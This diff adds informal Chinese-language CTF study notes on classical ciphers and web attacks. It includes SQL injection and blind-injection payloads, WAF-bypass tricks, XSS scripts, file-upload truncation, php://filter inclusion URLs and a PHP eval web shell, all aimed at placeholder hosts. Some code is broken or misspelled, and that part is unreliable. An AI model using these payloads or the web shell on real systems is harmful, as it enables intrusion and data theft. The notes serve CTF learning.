@@ -1,0 +1,207 @@
+FLAG{xxxxxx}
+flag{xxxxxxx}
+
+for a in range(10):
+    for b in range(10):
+	passwords = str(a)+str(b)+c+d+e+f
+
+
+for password in passwords:
+
+payload={
+	"username":"admin"
+	"password":password
+}
+
+
+源码泄露
+sql注入
+xss跨站脚本攻击
+文件上传
+文件包含
+暴力破解
+CSRF
+SSRF
+
+工具
+burpsuite
+sqlmap
+xss平台
+中国菜刀
+winhex
+
+python环境
+pip install requests 更新requests第三方库
+
+
+md5()
+strcmp()
+
+a1[]=abc 会让函数返回值为false
+
+
+签到题
+
+
+密码学
+base64      UIHUKWjidwj223==
+凯撒加密    flag{abcdefg}->gmbh{bcdefgh}
+栅栏加密    abcdef -> ab cd ef -> acebdf
+培根加密    AAAAB AABBA
+摩斯电码    -.- ... --- -.-
+键盘码      QWEDCXZA RTYHNBVF UIOL.,MJ
+		S	G	K
+
+	    432WSXCV
+
+凯撒加密+栅栏加密  gmbh{bcdefgh} ->gm bh {b cd ef h} ->gb{cehmhbdf}   xxxx{xxxxxx}
+
+
+目前的密码题目：给出加密方式的代码，进行逆操作，获取明文
+
+
+
+
+Web
+SQL注入
+
+
+http://www.test.com/test.php?id=1' union select password from user --
+
+select xxx form table where 'id'='1' union select password from user --'
+
+
+sql盲注
+
+http://www.test.com/test.php?id=1' and 1=2-- 
+
+select xxx form table where 'id' = '1' and 1=2 --'
+
+if(2>1,1,0)  返回值 1
+if(2<1,1,0)  返回值 0 
+
+
+1’ and 1=if(ascii(substr(select password form user,6,1)) > 109 ,1,0)    a-z(97-122)   A-Z(65-90)
+
+
+mysql
+mysql
+
+user
+
+username password
+
+
+WAF黑名单
+union select ‘’
+
+Union sELect
+
+%0a绕过
+%0b绕过
+
+空格绕过
+union/**/select/**/username/**/from xxx
+
+=绕过
+union select username,password form users where table_schema lIkE database()
+
+
+XSS
+$a=$_GET['a'];
+'<a>hello world</a>' + $a;
+
+<a>hello world</a><script>alert(document.cookie)</script>
+
+反射型
+a=<scirpt>alert(123)</script>
+
+存储型
+评论区，留言板
+<script>alert(document.cookie)</script>
+
+
+$a=$_GET['a'];
+<a></a><script>alert(123)</script><a></a>
+
+widhwu"<script>alert(123)</scrip>"dwugwyd
+
+
+文件上传
+%00截断
+?截断
+./填充
+
+
+shell.php%00.jpg
+$a = $_GET['a'];
+'http://xxx.xxx.xxx.xxx:xxxx/readfile?file=' + $a +'.jpg';
+
+a = shell.php? 
+http://xxx.xxx.xxx.xxx:xxxx/readfile?file=shell.php?.jpg
+
+
+a=././././././././././shell.php
+http://xxx.xxx.xxx.xxx:xxxx/readfile?file=././././././././././shell.php[.jpg]无法读取的字符
+
+
+shell.php
+<?php @eval($_POST['cmd']); ?>
+
+var/www/html/shell.php
+http://xxx.xxx.xxx.xxx:xxxx/shell.php
+
+中国菜刀
+url: http://xxx.xxx.xxx.xxx:xxxx/shell.php       password:cmd
+
+
+						    php 
+							
+							
+文件包含：
+http://xxx.xxx.xxx.xxx:xxxx/readfile.php?file=../flag.php
+php://filter/convert.base64-encode/source=flag.php
+
+http://xxx.xxx.xxx.xxx:xxxx/readfile.php?file=php://filter/convert.base64-encode/source=flag.php
+
+
+var/www/html/web/readfile.php
+var/www/html/flag.txt
+
+php伪协议
+php://input
+***php://filter
+
+
+phar://
+
+
+-... -.- -.-. - ..-. -- .. ... -.-.
+BKCTFMISC
+
+KYsd3js2 E{a2jda}
+KEY{sad23jjdsa2}
+
+
+&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125
+KEY{J2sa42ahJK-HS11III}
+
+
+select username from user where id = '' union select 1,2,3,4 #'
+
+数据库名字： skctf_flag
+表名:fl4g
+列名：skctf_flag
+
+' union select table_name,2,3,4 from information_schema.tables where table_schema=database()#
+' union select column_name,2,3,4 from information_schema.columns where table_name='fl4g'#
+
+
+
+flag.php.bak
+.flag.php.swp
+.flag.php.swo
+.git   -> GitHack
+.DSstore
+www.zip
+web.tar.gz
